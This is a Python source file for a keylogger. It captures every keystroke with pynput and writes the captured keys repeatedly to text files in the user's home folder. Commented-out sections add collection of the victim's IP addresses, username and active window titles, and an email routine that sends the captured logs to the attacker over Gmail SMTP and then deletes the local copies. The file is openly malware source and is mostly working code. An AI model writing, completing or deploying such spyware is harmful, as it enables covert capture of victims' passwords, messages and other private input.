## Advanced python key logger
##
##                  NOTES 
##
## if don't have pynput, have program reach out and install it
## pip3 install pynput
## pip3 install win32gui



'''imports'''
from pynput.keyboard import Key, Listener
import threading
import requests
import socket
import os
import time

### Variables ##
#publicIP = requests.get('https://api.ipify.org').text
#privateIP = socket.gethostbyname(socket.gethostname())
#user = os.path.expanduser('~')
#user = os.path.expanduser('~').split('\\')[2]
#datetime = time.ctime(time.time())


### Two formats for output   1. use str.format
###                          2. convert the value of <output> to a string and concatenate strings with +
#print('Your public ip is ' + str(publicIP))
#print('Your private ip is {} '.format(privateIP))
#print('The current user is' + str(user))
#print('The datetime is {}'.format(datetime))

# string arrays to hold stored data on computer instead of output
logged_data = []




def on_press(key):

#    ## array to hold key:value


    sub = ['Key.enter', '[ENTER]\n', 'key.space', ' ']

    ## this variable will strip the quotes from the returned key logger
    key = str(key).strip('\'')

    if key in sub:
        logged_data.append(sub[sub.index(key)+1])
    
    else:
    
        logged_data.append(key)
        print(key)



def write_file(count):
    
    ## This function will write to file on desktop
    ## variable for path to wrie file
#    file_location1 = os.path.expanduser('~') + '/Documents/'
    file_location2 = os.path.expanduser('~') + '/TEST_keylogger/'

#    list = [file_location1, file_location2]
    
    filename = "keylogger__" + str(count) + ".txt"
    filepath = file_location2
#    filepath = random.choice(list)
#    filename = str(count) + 'I' + random.randint(1000000,9999999) + '.txt'
    file = filepath + filename
    #delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))


def write_logs():

    count = 0

    time.sleep(5)
    while True:
        if len(logged_data) > 1:
            try:
                write_file(count)

                count += 1 
            
            
            except:
                pass

    
#####  Beginning of script

if __name__=='__main__':
    ## starts sending email
    thread1 = threading.Thread(target=write_logs)
    thread1.start()



    ## START KEYLOGGER
    with Listener(on_press=on_press) as listener:
        listener.join()



#from email.mime.multipart import MIMEMultipart
#from email.mime.text import MIMEText
#from email.mime.base import MIMEBase
#from email import encoders


#import gui
#import socket
#import time
#import win32gui

#import smtplib


#import os
#import random
#import requests
#import config


#msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~  Public-IP: {publicIP}\n  *~  Private-IP: {privateIP}\n\n'


#logged_data.append(msg)


#old_app = ''
#delete_file = []


#logged_data = []
#logged_data.append(msg)

#old_app = ''
#delete_file = []

#def on_press(key):
    #global old_app

    #new_app = wind32gui.GetWindowText(win32gui.GetForegroundWindow())

    #if new_app == 'Cortana':
    #    new_app = 'Windows start menu'
    #else:
    #    pass



#def send_logs():
#    count = 0
#
#    fromAddr = config.fromAddr
#    fromPswd = config.fromPswd
#    toAddr = fromAddr
#
#    MIN = 10
#    SECONDS = 60
#
#    time.sleep(5)
#    while True:
#        if len(logged_data) > 1:
#            try:
#                write_file(count)
#
#                subject = f'[{user}] ~ {count}'
#
#                msg = MIMEMultipart()
#                msg['FROM'] = fromAddr
#                msg['To'] = toAddr
#                msg['Subject'] = subject
#                body = 'testing'
#                msg.attach(MIMEText(body,'plain'))
#
#                attachment = open(delete_file[0], 'rb')
#
#                filename = delete_file[0].split('/')[2]
#
#                part = MIMEBase('application', 'octect-stream')
#                part.set_payload((attachment).read())
#                encoders.encode_base64(part)
#                part.add_header('content-disposition', 'attachment;filename='+str(filename))
#                msg.attach(part)
#
#                text = msg.as_string()
#
#                s = smtplib.SMTP('smtp.gmail.com', 587)
#                s.ehlo()
#                s.starttls()
#                s.ehlo() 
#                #extended hello?????
#                s.login(fromAddr, fromPswd)
#                s.sendmail(fromAddr, toAddr, text)
#                attachment.close()
#                s.close()
#
#                os.remove(delete_file[0])
#                del logged_data[1:]
#                del delete_file[0:]
#
#                count += 1
#
#            except:
#                pass





